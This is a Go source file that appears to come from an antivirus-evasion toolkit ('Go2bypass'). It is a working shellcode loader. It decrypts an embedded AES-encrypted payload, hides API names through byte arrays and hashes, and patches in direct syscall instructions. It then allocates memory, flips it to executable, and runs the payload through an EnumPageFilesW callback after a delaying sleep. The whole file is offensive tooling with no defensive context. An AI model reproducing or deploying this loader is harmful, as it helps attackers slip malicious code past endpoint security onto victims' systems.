package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"Go2bypass/Doge-Gabh/eggreplace"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"reflect"
	"syscall"
	"unsafe"
)

//go:embed CodeToStringShell.txt
var CodeToStringShell string

func main() {
	//ntdll sleep()
	sleep1, e := Go2gabh.MemHgate("84804f99e2c7ab8aee611d256a085cf4879c4be8", Str2sha1)
	if e != nil {
		panic(e)
	}
	times := -(30000 * 10000)
	eggreplace.FindAndReplace(
		[]byte{0x65, 0x67, 0x67, 0x63, 0x61, 0x6c, 0x6c},
		[]byte{0x90, 0x90, 0x0f, 0x05, 0x90, 0x90, 0x90},
		reflect.ValueOf(Go2gabh.EggCall).Pointer())

	fmt.Printf("%s: %x\n", " Sysid", sleep1)
	Go2gabh.HgSyscall(sleep1, 0, uintptr(unsafe.Pointer(&times)))

	fmt.Printf("%s: %x\n", " Sysid", sleep1)
	Go2gabh.EggCall(sleep1, 0, uintptr(unsafe.Pointer(&times)))
	encrypted, _ := base64.StdEncoding.DecodeString(CodeToStringShell)
	sc := AesDecryptCFB(encrypted, []byte(`4e3JTBw2VOauD2q9`))
	EnumPageFilesW, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'p', 's', 'a', 'p', 'i', '.', 'd', 'l', 'l'}), "27a2229b308599a48d1ca5d8ca86bcba9cd84de3", Str2sha1)
	alloc, e := Go2gabh.GetSSNByNameExcept(Str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Str2sha1)
	if e != nil {
		os.Exit(0)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Sha256Hex)
	if e != nil {
		os.Exit(0)
	}
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var handle = uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(len(sc))
	_, r := Go2gabh.EggCall(
		uint16(alloc),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		os.Exit(0)
	}
	Cpymem(baseA, sc)

	var oldprotect uintptr
	_, r = Go2gabh.EggCall(
		uint16(protect),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		os.Exit(0)
	}
	syscall.Syscall(uintptr(EnumPageFilesW), 2, baseA, 0, 0)
}
func AesDecryptCFB(encrypted []byte, key []byte) (decrypted []byte) {
	block, _ := aes.NewCipher(key)
	if len(encrypted) < aes.BlockSize {
		panic("ciphertext too short")
	}
	iv := encrypted[:aes.BlockSize]
	encrypted = encrypted[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encrypted, encrypted)
	return encrypted
}
func Str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Cpymem(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
